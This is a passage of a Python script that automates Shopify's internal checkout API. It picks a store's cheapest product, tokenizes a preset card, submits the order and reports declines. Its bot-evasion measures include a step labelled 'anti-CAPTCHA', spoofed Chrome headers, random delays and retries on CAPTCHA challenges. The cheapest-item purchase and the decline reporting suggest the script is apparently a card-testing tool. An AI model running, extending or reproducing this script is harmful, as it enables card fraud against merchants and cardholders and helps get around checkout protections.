                            "billingAddress":  {"streetAddress": billing_address},
                            "cardSource": None
                        }
                    },
                    "amount": {"value": {"amount": format_amount(payment_amount), "currencyCode": "USD"}}
                }]
            )
        },
        "buyerIdentity": {
            "customer": {"presentmentCurrency": "USD", "countryCode": "US"},
            "email":  CHECKOUT_DATA["email"],
            "emailChanged": False,
            "phoneCountryCode": "US",
            "marketingConsent": [{"email": {"value": CHECKOUT_DATA["email"]}}],
            "shopPayOptInPhone": {"countryCode": "US"},
            "rememberMe": False
        },
        "tip": {"tipLines": []},
        "taxes": {
            "proposedAllocations": None,
            "proposedTotalAmount": (
                {"any": True}
                if payment_any or (payment_amount is None)
                else {"value": {"amount": format_amount(payment_amount), "currencyCode": "USD"}}
            ),
            "proposedTotalIncludedAmount": None,
            "proposedMixedStateTotalAmount": None,
            "proposedExemptions": []
        },
        "note": {"message": None, "customAttributes": []},
        "localizationExtension": {"fields": []},
        "nonNegotiableTerms": None,
        "scriptFingerprint": {
            "signature": None,
            "signatureUuid": None,
            "lineItemScriptChanges": [],
            "paymentScriptChanges": [],
            "shippingScriptChanges": []
        },
        "optionalDuties": {"buyerRefusesDuties": False},
        "cartMetafields": []
    }
    
    if queue_token:
        variables["queueToken"] = queue_token
    
    return variables

def send_proposal(session, endpoint, session_token, variant_info, delivery_handle, payment_any=True, payment_amount=None, card_session_id=None, payment_method_identifier=None, use_partial_address=False, destination_changed=False, queue_token=None, delivery_expectations=None, shipping_amount=None, use_any_merchandise=False, checkout_token=None, delivery_method_type="SHIPPING"):
    random_delay(200, 400)  # Short delay between proposals
    
    parsed = urlparse(DOMAIN)
    domain = parsed.netloc
    keep_alive = generate_keep_alive_cookie()
    session.cookies.set("keep_alive", keep_alive, domain=domain)
    
    body = {
        "variables": proposal_variables_generic(session_token, variant_info, delivery_handle, payment_any, payment_amount, card_session_id, payment_method_identifier, use_partial_address, destination_changed, queue_token, delivery_expectations, shipping_amount, use_any_merchandise, delivery_method_type),
        "operationName": "Proposal",
        "id": PROPOSAL_QUERY_ID  # Use persisted query ID instead of full query
    }
    headers = {
        "Accept": "application/json",
        "Accept-Language": "en-US",
        "Content-Type": "application/json",
        "Origin": DOMAIN,
        "Referer": f"{DOMAIN}/checkouts/cn/{checkout_token}/" if checkout_token else f"{DOMAIN}/",
        "priority": "u=1, i",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "shopify-checkout-client": "checkout-web/1.0",
        "shopify-checkout-source": f'id="{checkout_token}", type="cn"' if checkout_token else "",
        "x-checkout-one-session-token": session_token,
        "x-checkout-web-build-id": BUILD_ID,
        "x-checkout-web-deploy-stage": "production",
        "x-checkout-web-server-handling": "fast",
        "x-checkout-web-server-rendering": "yes",
        "x-checkout-web-source-id": checkout_token or "",
    }
    print(f"    DEBUG: Sending proposal POST to {endpoint}...")
    r = session.post(endpoint, headers=headers, json=body, timeout=30)
    print(f"    DEBUG: Got proposal response")
    return r

def submit_for_completion(session, endpoint, session_token, variant_info, delivery_handle, merchandise_amount, shipping_amount, checkout_total, card_session_id, payment_method_identifier, checkout_token, queue_token, delivery_expectations=None, delivery_method_type="SHIPPING", tax_amount=None):
    domain = DOMAIN.replace("https://", "").replace("http://", "")
    keep_alive = generate_keep_alive_cookie()
    session.cookies.set("keep_alive", keep_alive, domain=domain, path="/")
    
    negotiation_input = build_submission_input(
        session_token, variant_info, delivery_handle, merchandise_amount,
        shipping_amount, checkout_total, card_session_id,
        payment_method_identifier, queue_token, checkout_token, delivery_expectations,
        delivery_method_type, tax_amount
    )
    
    print("\n  ===== SUBMISSION DEBUG =====")
    delivery_line = negotiation_input.get('delivery', {}).get('deliveryLines', [{}])[0]
    print(f"  DELIVERY LINE:")
    strategy = delivery_line.get('selectedDeliveryStrategy', {})
    if 'deliveryStrategyByHandle' in strategy:
        print(f"    handle: {strategy.get('deliveryStrategyByHandle', {}).get('handle', 'N/A')}")
        print(f"    customDeliveryRate: {strategy.get('deliveryStrategyByHandle', {}).get('customDeliveryRate', 'N/A')}")
    elif 'deliveryStrategyMatchingConditions' in strategy:
        print(f"    strategy: deliveryStrategyMatchingConditions (digital product)")
    print(f"    options: {strategy.get('options', 'N/A')}")
    print(f"    expectedTotalPrice: {delivery_line.get('expectedTotalPrice', 'N/A')}")
    print(f"    destinationChanged: {delivery_line.get('destinationChanged', 'N/A')}")
    print(f"    deliveryMethodTypes: {delivery_line.get('deliveryMethodTypes', 'N/A')}")
    print(f"    targetMerchandiseLines: {delivery_line.get('targetMerchandiseLines', 'N/A')}")
    
    dest = delivery_line.get('destination', {}).get('streetAddress', {})
    if dest:
        print(f"    destination.streetAddress:")
        print(f"      address1: {dest.get('address1', 'N/A')}")
        print(f"      city: {dest.get('city', 'N/A')}")
        print(f"      countryCode: {dest.get('countryCode', 'N/A')}")
        print(f"      zoneCode: {dest.get('zoneCode', 'N/A')}")
        print(f"      postalCode: {dest.get('postalCode', 'N/A')}")
        print(f"      phone: '{dest.get('phone', 'N/A')}'")
        print(f"      oneTimeUse: {dest.get('oneTimeUse', 'N/A')}")
        print(f"      address2: '{dest.get('address2', 'N/A')}'")
    else:
        print(f"    destination: None (digital product)")
    
    print(f"  DELIVERY EXPECTATIONS:")
    exp_lines = negotiation_input.get('deliveryExpectations', {}).get('deliveryExpectationLines', [])
    print(f"    count: {len(exp_lines)}")
    for i, exp in enumerate(exp_lines):
        sh = exp.get('signedHandle', '')
        print(f"    [{i}] signedHandle: {sh[:80]}..." if len(sh) > 80 else f"    [{i}] signedHandle: {sh}")
    
    print(f"  MERCHANDISE:")
    merch_line = negotiation_input.get('merchandise', {}).get('merchandiseLines', [{}])[0]
    print(f"    stableId: {merch_line.get('stableId', 'N/A')}")
    print(f"    expectedTotalPrice: {merch_line.get('expectedTotalPrice', 'N/A')}")
    print(f"    variantId: {merch_line.get('merchandise', {}).get('productVariantReference', {}).get('variantId', 'N/A')}")
    
    print(f"  PAYMENT:")
    print(f"    totalAmount: {negotiation_input.get('payment', {}).get('totalAmount', 'N/A')}")
    payment_line = negotiation_input.get('payment', {}).get('paymentLines', [{}])[0]
    print(f"    paymentMethodIdentifier: {payment_line.get('paymentMethod', {}).get('directPaymentMethod', {}).get('paymentMethodIdentifier', 'N/A')}")
    print(f"    sessionId: {payment_line.get('paymentMethod', {}).get('directPaymentMethod', {}).get('sessionId', 'N/A')}")
    print(f"    amount: {payment_line.get('amount', 'N/A')}")
    
    print(f"  OTHER:")
    print(f"    queueToken: {negotiation_input.get('queueToken', 'N/A')[:50]}..." if negotiation_input.get('queueToken') else "    queueToken: N/A")
    print(f"    taxes: {negotiation_input.get('taxes', 'N/A')}")
    print("  =============================\n")
    
    with open('debug_submission.json', 'w') as f:
        json.dump(negotiation_input, f, indent=2)
    print("  DEBUG: Wrote full submission input to debug_submission.json")
    
    attempt_token = f"{checkout_token}-{uuid.uuid4().hex[:10]}"
    page_id = str(uuid.uuid4())
    
    body = {
        "variables": {
            "input": negotiation_input,
            "attemptToken": attempt_token,
            "metafields": [],
            "analytics": {
                "requestUrl": f"{DOMAIN}/checkouts/cn/{checkout_token}/",
                "pageId": page_id
            }
        },
        "operationName": "SubmitForCompletion",
        "id": SUBMIT_QUERY_ID  # Use persisted query ID instead of full query
    }
    
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Accept-Language": "en-US",
        "Origin": DOMAIN,
        "Referer": f"{DOMAIN}/checkouts/cn/{checkout_token}/",
        "priority": "u=1, i",
        "shopify-checkout-client": "checkout-web/1.0",
        "shopify-checkout-source": f'id="{checkout_token}", type="cn"',
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "x-checkout-one-session-token": session_token,
        "x-checkout-web-build-id": BUILD_ID,
        "x-checkout-web-deploy-stage": "production",
        "x-checkout-web-server-handling": "fast",
        "x-checkout-web-server-rendering": "yes",
        "x-checkout-web-source-id": checkout_token,
        "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
    }
    
    random_delay(200, 500)  # Delay before final submission
    print(f"  DEBUG: Sending POST to {endpoint}")
    print(f"  DEBUG: Body size: {len(json.dumps(body))} bytes")
    try:
        r = session.post(endpoint, headers=headers, json=body, timeout=30)
    except Exception as e:
        print(f"  DEBUG: Request exception: {e}")
        raise
    print(f"  DEBUG: Got response")
    return r

def extract_delivery_info(resp_data):
    checkout_total = None
    merchandise_amount = None
    shipping_amount = None
    delivery_handle = None
    queue_token = None
    delivery_expectations = []
    payment_method_identifier = None
    delivery_method_type = "SHIPPING"  # default
    tax_amount = None
    
    try:
        result = resp_data.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
        
        if result.get('__typename') == 'NegotiationResultAvailable':
            queue_token = result.get('queueToken')
            seller_proposal = result.get('sellerProposal', {})
            
            checkout_total_obj = seller_proposal.get('checkoutTotal', {})
            value = checkout_total_obj.get('value')
            if value and 'amount' in value:
                checkout_total = value["amount"]
            
            subtotal_obj = seller_proposal.get('subtotalBeforeTaxesAndShipping', {})
            value = subtotal_obj.get('value')
            if value and 'amount' in value: 
                merchandise_amount = value["amount"]
            
            delivery_exp_terms = seller_proposal.get('deliveryExpectations', {})
            if delivery_exp_terms.get('__typename') == 'FilledDeliveryExpectationTerms':
                expectations = delivery_exp_terms.get('deliveryExpectations', [])
                for exp in expectations:
                    signed_handle = exp.get('signedHandle')
                    if signed_handle:
                        delivery_expectations.append({"signedHandle": signed_handle})
            
            delivery_terms = seller_proposal.get('delivery', {})
            if delivery_terms.get('__typename') == 'FilledDeliveryTerms':
                delivery_lines = delivery_terms.get('deliveryLines', [])
                if delivery_lines:
                    dmt = delivery_lines[0].get('deliveryMethodTypes', ['SHIPPING'])
                    if dmt:
                        delivery_method_type = dmt[0]  # e.g. "SHIPPING" or "NONE"
                    
                    strategies = delivery_lines[0].get('availableDeliveryStrategies', [])
                    if strategies:
                        strategy = strategies[0]
                        delivery_handle = strategy.get('handle')
                        method_type = strategy.get('methodType')
                        if method_type and method_type != 'SHIPPING':
                            delivery_method_type = method_type
                        shipping_cost_obj = strategy.get('amount', {})
                        value = shipping_cost_obj.get('value')
                        if value and 'amount' in value: 
                            shipping_amount = value["amount"]
            
            payment_terms = seller_proposal.get('payment', {})
            if payment_terms.get('__typename') == 'FilledPaymentTerms':
                available_lines = payment_terms.get('availablePaymentLines', [])
                for line in available_lines:
                    pm = line.get('paymentMethod', {})
                    pmi = pm.get('paymentMethodIdentifier')
                    if pmi and pm.get('__typename') == 'PaymentProvider':
                        payment_method_identifier = pmi
                        break
            
            tax_terms = seller_proposal.get('taxes', {})
            if tax_terms.get('__typename') == 'FilledTaxTerms':
                total_tax = tax_terms.get('totalTaxAmount', {})
                tax_value = total_tax.get('value')
                if tax_value and 'amount' in tax_value:
                    tax_amount = tax_value['amount']
                    print(f"  Tax amount from proposal: ${tax_amount}")
    except Exception as e:
        print(f"  [Error] Exception:  {e}")
    
    return checkout_total, merchandise_amount, shipping_amount, delivery_handle, queue_token, delivery_expectations, payment_method_identifier, delivery_method_type, tax_amount

def main():
    shop_url = DOMAIN
    card_data = CARD
    session = create_session(shop_url)

    print(f"[Session] Using stable ID: {SESSION_STABLE_ID}")
    print("[Step 0] Detecting product...")
    variant_info = auto_detect_cheapest_product(session, shop_url)
    if not variant_info:
        print("No product found.")
        return
    print(f"Product: {variant_info['product_title']} | Variant: {variant_info['variant_id']} | Price: ${variant_info['variant_price']}")
    
    requires_shipping = variant_info.get('requires_shipping', True)
    initial_delivery_method_type = "SHIPPING" if requires_shipping else "NONE"
    if not requires_shipping:
        print(f"  → Digital product detected (requires_shipping=False)")

    print("[Step 1] Add to cart & create checkout...")
    checkout_token, session_token, cookies, extra_data = step1_add_to_cart(session, shop_url, variant_info["variant_id"])
    if not checkout_token or not session_token:
        print("Checkout/session token not found.")
        return
    print(f"Checkout token: {checkout_token}")

    shop_id = extra_data.get("shop_id", 0)
    api_client_id = extra_data.get("api_client_id", 0)
    checkout_assets = extra_data.get("checkout_assets", [])
    
    print("[Step 1.5] Simulating browser behavior (anti-CAPTCHA)...")
    if checkout_assets:
        preload_checkout_assets(session, shop_url, checkout_token, checkout_assets)
    
    random_delay(200, 500)
    send_trekkie_beacon(session, shop_url, checkout_token, shop_id=shop_id, api_client_id=api_client_id)

    random_delay(300, 500)  # Delay before tokenizing card
    print("[Step 2] Tokenizing card...")
    card_session_id = step2_tokenize_card(session, shop_url, card_data)
    if not card_session_id:
        print("Card tokenization failed.")
        return
    print(f"Card session ID:  {card_session_id}")

    endpoint = f"{DOMAIN}/checkouts/internal/graphql/persisted?operationName=Proposal"
    FALLBACK_DELIVERY_HANDLE = "111c0fdf075c863fc9a4fedc1caf5564-522db75da0907148a4416ecd5f76e63b"

    print("[Step 3] Proposal #1: Get available shipping methods (payment:  any/any)...")
    
    max_poll_attempts = 5
    delivery_expectations = []
    queue_token_1 = None
    delivery_handle = None
    checkout_total = None
    merchandise_amount = None
    shipping_amount = None
    payment_method_identifier = None
    delivery_method_type = initial_delivery_method_type
    
    for poll_attempt in range(max_poll_attempts):
        random_delay(200, 400)  # Short delay before each proposal attempt
        r1 = send_proposal(session, endpoint, session_token, variant_info, "any", payment_any=True, use_partial_address=True, destination_changed=False, use_any_merchandise=False, checkout_token=checkout_token, delivery_method_type=initial_delivery_method_type)
        print(f"  [Attempt {poll_attempt + 1}] Response status: {r1.status_code}")
        
        try:
            resp1_data = r1.json()
            
            proposal1_filename = f'debug_proposal1_attempt{poll_attempt + 1}.json'
            with open(proposal1_filename, 'w') as f:
                json.dump(resp1_data, f, indent=2)
            print(f"  DEBUG: Saved response to {proposal1_filename}")
            
            seller_prop = resp1_data.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {}).get('sellerProposal', {})
            del_exp = seller_prop.get('deliveryExpectations', {})
            exp_typename = del_exp.get('__typename')
            print(f"  deliveryExpectations __typename: {exp_typename}")
            
            checkout_total, merchandise_amount, shipping_amount, delivery_handle, queue_token_1, delivery_expectations, payment_method_identifier, delivery_method_type, tax_amount = extract_delivery_info(resp1_data)
            is_digital = (delivery_method_type == "NONE")
            
            if is_digital:
                print(f"  ✓ Digital product - no delivery expectations needed")
                break
            elif exp_typename == 'FilledDeliveryExpectationTerms' and len(delivery_expectations) > 0:
                print(f"  ✓ Got {len(delivery_expectations)} delivery expectations!")
                break
            elif exp_typename == 'UnavailableTerms':
                print(f"  ✓ No delivery expectations needed (digital/non-shipping product)")
                break
            elif exp_typename == 'PendingTerms':
                poll_delay = del_exp.get('pollDelay', 500)
                wait_seconds = max(poll_delay / 1000.0, 1.5)  # Minimum 1.5s delay
                print(f"  Expectations pending, waiting {wait_seconds}s...")
                time.sleep(wait_seconds)
        except Exception as e: 
            print(f"  Exception: {e}")
            print(r1.text)
            return
    
    if is_digital:
        if not checkout_total or not merchandise_amount:
            print("[Error] Could not extract required data from first proposal")
            return
        delivery_handle = delivery_handle or "none"  # Fallback, won't be used for digital
    else:
        if not checkout_total or not merchandise_amount or not delivery_handle:
            print("[Error] Could not extract required data from first proposal")
            return
    if shipping_amount is None:
        shipping_amount = "0"
    
    print(f"  Proposal 1 delivery handle: {delivery_handle}")
    print(f"  Total: ${checkout_total} (Product: ${merchandise_amount} + Shipping: ${shipping_amount})")
    print(f"  Delivery expectations: {len(delivery_expectations)} found")
    print(f"  Delivery method type: {delivery_method_type} ({'DIGITAL' if is_digital else 'PHYSICAL'})")
    print(f"  Queue token 1: {queue_token_1[:50] if queue_token_1 else 'None'}...")

    random_delay(300, 600)  # Delay before Step 3.5
    final_queue_token = queue_token_1
    
    if is_digital:
        print("[Step 3.5] Skipping shipping confirmation (digital product)...")
    else:
        print("[Step 3.5] Proposal #2: Confirm selected shipping method...")
    
    max_poll_attempts = 5
    
    for poll_attempt in range(max_poll_attempts if not is_digital else 0):
        random_delay(200, 400)  # Short delay before each poll attempt
        print(f"  [Attempt {poll_attempt + 1}] Polling with selected handle...")
        
        r_poll = send_proposal(
            session, endpoint, session_token, variant_info,
            delivery_handle,
            payment_any=True,
            use_partial_address=False, 
            destination_changed=False,
            queue_token=final_queue_token,
            shipping_amount=shipping_amount,
            use_any_merchandise=False,
            checkout_token=checkout_token,
            delivery_method_type=delivery_method_type
        )
        
        print(f"  Response status: {r_poll.status_code}")
        
        try:
            resp_poll = r_poll.json()
            
            poll_filename = f'debug_proposal2_poll{poll_attempt + 1}.json'
            with open(poll_filename, 'w') as f:
                json.dump(resp_poll, f, indent=2)
            print(f"  DEBUG: Saved response to {poll_filename}")
            
            seller_prop = resp_poll.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
            
            new_queue_token = seller_prop.get('queueToken')
            if new_queue_token:
                final_queue_token = new_queue_token
                print(f"  Updated queue token: {final_queue_token[:50]}...")
            
            del_exp = seller_prop.get('sellerProposal', {}).get('deliveryExpectations', {})
            exp_typename = del_exp.get('__typename')
            print(f"  deliveryExpectations __typename: {exp_typename}")
            
            if exp_typename == 'FilledDeliveryExpectationTerms':
                new_delivery_expectations = del_exp.get('deliveryExpectations', [])
                if new_delivery_expectations:
                    delivery_expectations = [{"signedHandle": e.get("signedHandle")} for e in new_delivery_expectations if e.get("signedHandle")]
                    print(f"  ✓ Poll complete - {len(delivery_expectations)} expectations")
                break
            elif exp_typename == 'PendingTerms':
                poll_delay = del_exp.get('pollDelay', 500)
                wait_seconds = max(poll_delay / 1000.0, 1.5)  # Minimum 1.5s delay
                print(f"  Pending, waiting {wait_seconds}s...")
                time.sleep(wait_seconds)
            else:
                print(f"  Unexpected typename: {exp_typename}")
                break
        except Exception as e:
            print(f"  Exception: {e}")
            break

    random_delay(300, 600)  # Delay before payment proposal
    print("[Step 3.75] Proposal #3: Include payment information...")
    
    r_payment = send_proposal(
        session, endpoint, session_token, variant_info,
        delivery_handle,
        payment_any=False,  # Now include specific payment
        payment_amount=checkout_total,
        card_session_id=card_session_id,
        payment_method_identifier=payment_method_identifier,
        use_partial_address=False,
        destination_changed=False,
        queue_token=final_queue_token,
        delivery_expectations=delivery_expectations,
        shipping_amount=shipping_amount,
        use_any_merchandise=False,
        checkout_token=checkout_token,
        delivery_method_type=delivery_method_type
    )
    
    print(f"  Response status: {r_payment.status_code}")
    try:
        resp_payment = r_payment.json()
        with open('debug_proposal3_payment.json', 'w') as f:
            json.dump(resp_payment, f, indent=2)
        print("  DEBUG: Saved payment proposal response to debug_proposal3_payment.json")
        
        result = resp_payment.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
        new_queue_token = result.get('queueToken')
        if new_queue_token:
            final_queue_token = new_queue_token
            print(f"  Updated queue token: {final_queue_token[:50]}...")
        
        seller_prop = result.get('sellerProposal', {})
        tax_terms = seller_prop.get('taxes', {})
        if tax_terms.get('__typename') == 'FilledTaxTerms':
            total_tax = tax_terms.get('totalTaxAmount', {})
            tax_val = total_tax.get('value')
            if tax_val and 'amount' in tax_val:
                tax_amount = tax_val['amount']
                print(f"  Tax amount from payment proposal: ${tax_amount}")
        
        ct_obj = seller_prop.get('checkoutTotal', {})
        ct_val = ct_obj.get('value')
        if ct_val and 'amount' in ct_val:
            checkout_total = ct_val['amount']
            print(f"  Updated checkout total: ${checkout_total}")
        
        if result.get('__typename') == 'NegotiationResultFailed':
            print(f"  ⚠️ Payment proposal failed - continuing anyway...")
        else:
            print(f"  ✓ Payment proposal accepted")
    except Exception as e:
        print(f"  Exception in payment proposal: {e}")

    random_delay(300, 600)  # Delay before final submission
    print(f"[Step 4] Submitting for completion...")
    submit_endpoint = f"{DOMAIN}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion"
    
    max_submit_attempts = 3
    for submit_attempt in range(max_submit_attempts):
        r4 = submit_for_completion(
            session, submit_endpoint, session_token, variant_info,
            delivery_handle, merchandise_amount, shipping_amount, checkout_total,
            card_session_id, payment_method_identifier,
            checkout_token, final_queue_token, delivery_expectations,
            delivery_method_type, tax_amount
        )
        
        print(f"  Response status: {r4.status_code}")
        
        try:
            resp4_data = r4.json()
            
            with open('debug_submit_response.json', 'w') as f:
                json.dump(resp4_data, f, indent=2)
            print("  DEBUG: Saved submit response to debug_submit_response.json")
            
            submit_result = resp4_data.get('data', {}).get('submitForCompletion', {})
            typename = submit_result.get('__typename')
            print(f"  Result type: {typename}")
            
            if typename == 'SubmitRejected':
                errors = submit_result.get('errors', [])
                is_confirm_change = any(e.get('__typename') == 'ConfirmChangeViolation' for e in errors)
                if is_confirm_change and submit_attempt < max_submit_attempts - 1:
                    is_tax_violation = any('TAX' in (e.get('code', '') or '') for e in errors)
                    if is_tax_violation:
                        print(f"  ⚠️ Tax changed - re-sending proposal to get updated taxes...")
                        r_refresh = send_proposal(
                            session, endpoint, session_token, variant_info,
                            delivery_handle,
                            payment_any=False,
                            payment_amount=checkout_total,
                            card_session_id=card_session_id,
                            payment_method_identifier=payment_method_identifier,
                            use_partial_address=False,
                            destination_changed=False,
                            queue_token=final_queue_token,
                            delivery_expectations=delivery_expectations,
                            shipping_amount=shipping_amount,
                            use_any_merchandise=False,
                            checkout_token=checkout_token,
                            delivery_method_type=delivery_method_type
                        )
                        try:
                            refresh_data = r_refresh.json()
                            refresh_result = refresh_data.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
                            new_qt = refresh_result.get('queueToken')
                            if new_qt:
                                final_queue_token = new_qt
                            sp = refresh_result.get('sellerProposal', {})
                            tt = sp.get('taxes', {})
                            if tt.get('__typename') == 'FilledTaxTerms':
                                tv = tt.get('totalTaxAmount', {}).get('value')
                                if tv and 'amount' in tv:
                                    tax_amount = tv['amount']
                                    print(f"  Updated tax amount: ${tax_amount}")
                            ct = sp.get('checkoutTotal', {}).get('value')
                            if ct and 'amount' in ct:
                                checkout_total = ct['amount']
                                print(f"  Updated checkout total: ${checkout_total}")
                        except Exception as ex:
                            print(f"  Failed to refresh proposal: {ex}")
                    else:
                        print(f"  ⚠️ ConfirmChangeViolation - auto-retrying ({submit_attempt + 2}/{max_submit_attempts})...")
                    random_delay(1000, 2000)
                    continue
            
            if typename in ['SubmitSuccess', 'SubmitAlreadyAccepted', 'SubmittedForCompletion']:
                receipt = submit_result.get('receipt', {})
                receipt_type = receipt.get('__typename')
                receipt_id = receipt.get('id')
                
                if receipt_type == 'ProcessedReceipt':
                    order_id = receipt.get('orderIdentity', {}).get('id')
                    order_number = receipt.get('orderIdentity', {}).get('buyerIdentifier')
                    print(f"\n🎉 [ORDER PLACED] Order ID: {order_id}")
                    if order_number:
                        print(f"   Order Number: {order_number}")
                elif receipt_type == 'ProcessingReceipt' and receipt_id:
                    print(f"\n⏳ [PROCESSING] Receipt ID: {receipt_id}")
                    print("[Step 5] Polling for receipt...")
                    
                    max_receipt_polls = 10
                    
                    for poll_i in range(max_receipt_polls):
                        poll_delay = receipt.get('pollDelay', 2000)
                        wait_seconds = max(poll_delay / 1000.0, 2.5)  # Minimum 2.5s delay
                        print(f"  [Poll {poll_i + 1}/{max_receipt_polls}] Waiting {wait_seconds}s...")
                        time.sleep(wait_seconds)
                        
                        domain = DOMAIN.replace("https://", "").replace("http://", "")
                        keep_alive = generate_keep_alive_cookie()
                        session.cookies.set("keep_alive", keep_alive, domain=domain, path="/")
                        
                        poll_variables = {
                            "receiptId": receipt_id,
                            "sessionToken": session_token
                        }
                        variables_json = json.dumps(poll_variables, separators=(',', ':'))
                        variables_encoded = quote(variables_json, safe='')
                        
                        poll_endpoint = f"{DOMAIN}/checkouts/internal/graphql/persisted?operationName=PollForReceipt&variables={variables_encoded}&id={POLL_RECEIPT_QUERY_ID}"
                        
                        poll_headers = {
                            "Accept": "application/json",
                            "Accept-Language": "en-US",
                            "Content-Type": "application/json",
                            "Origin": DOMAIN,
                            "Referer": f"{DOMAIN}/checkouts/cn/{checkout_token}/",
                            "priority": "u=1, i",
                            "shopify-checkout-client": "checkout-web/1.0",
                            "shopify-checkout-source": f'id="{checkout_token}", type="cn"',
                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
                            "x-checkout-one-session-token": session_token,
                            "x-checkout-web-build-id": BUILD_ID,
                            "x-checkout-web-deploy-stage": "production",
                            "x-checkout-web-server-handling": "fast",
                            "x-checkout-web-server-rendering": "yes",
                            "x-checkout-web-source-id": checkout_token,
                            "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                            "sec-ch-ua-mobile": "?0",
                            "sec-ch-ua-platform": '"Windows"',
                            "sec-fetch-dest": "empty",
                            "sec-fetch-mode": "cors",
                            "sec-fetch-site": "same-origin",
                        }
                        
                        r_poll = session.get(poll_endpoint, headers=poll_headers)
                        poll_data = r_poll.json()
                        
                        receipt_poll_filename = f'debug_receipt_poll{poll_i + 1}.json'
                        with open(receipt_poll_filename, 'w') as f:
                            json.dump(poll_data, f, indent=2)
                        print(f"  DEBUG: Saved receipt poll to {receipt_poll_filename}")
                        
                        poll_receipt = poll_data.get('data', {}).get('receipt', {})
                        poll_receipt_type = poll_receipt.get('__typename')
                        
                        print(f"  Receipt type: {poll_receipt_type}")
                        
                        if poll_receipt_type == 'ProcessedReceipt':
                            order_id = poll_receipt.get('orderIdentity', {}).get('id')
                            order_number = poll_receipt.get('orderIdentity', {}).get('buyerIdentifier')
                            print(f"\n🎉 [ORDER COMPLETED] Order ID: {order_id}")
                            if order_number:
                                print(f"   Order Number: {order_number}")
                            break
                        elif poll_receipt_type == 'FailedReceipt':
                            error = poll_receipt.get('processingError', {}) or {}
                            error_code = error.get('code') or 'UNKNOWN'
                           
                            if error_code == 'CAPTCHA_REQUIRED':
                                captcha_retries = getattr(main, '_captcha_retries', 0)
                                if captcha_retries < 2:
                                    main._captcha_retries = captcha_retries + 1
                                    print(f"  ⚠️ CAPTCHA_REQUIRED - Retrying ({main._captcha_retries}/2)...")
                                    time.sleep(3)  # Wait 3 seconds before retry
                                    continue
                                else:
                                    print(f"\n❌ [ORDER FAILED] CAPTCHA_REQUIRED after 2 retries")
                                    main._captcha_retries = 0  # Reset for next run
                                    break
                           
                            error_msg = (
                                error.get('messageUntranslated')
                                or error.get('message')
                                or error.get('merchantMessage')
                                or error.get('declineMessage')
                                or error.get('reason')
                                or ''
                            )
                            print(f"\n❌ [ORDER FAILED] {error_code}: {error_msg if error_msg else 'No message provided'}")
                           
                            try:
                                print("  Processing error details:")
                                print(json.dumps(error, indent=2))
                            except Exception:
                                pass
                            break
                        elif poll_receipt_type in ['ProcessingReceipt', 'WaitingReceipt']:
                            receipt = poll_receipt
                            continue
                        else:
                            print(f"  Unexpected receipt type: {poll_receipt_type}")
                            break
                    else:
                        print("\n⚠️ [TIMEOUT] Receipt polling timed out")
                else:
                    print(f"\n⚠️ [UNKNOWN RECEIPT] Type: {receipt_type}, Data: {receipt}")
            elif typename == 'SubmitFailed':
                reason = submit_result.get('reason')
                print(f"\n❌ [SUBMIT FAILED] Reason: {reason}")
            elif typename == 'SubmitRejected':
                errors = submit_result.get('errors', [])
                print(f"\n❌ [SUBMIT REJECTED] Errors: {errors}")
            elif typename == 'Throttled':
                poll_after = submit_result.get('pollAfter')
                print(f"\n⚠️ [THROTTLED] Poll after: {poll_after}")
            else:
                print(f"\n❓ [UNKNOWN] Response type: {typename}")
            break  # Exit retry loop after processing non-retryable result
        except Exception as e:
            print(f"  Error: {e}")
            print(r4.text)
            break  # Exit retry loop on exception

if __name__ == "__main__":
    main()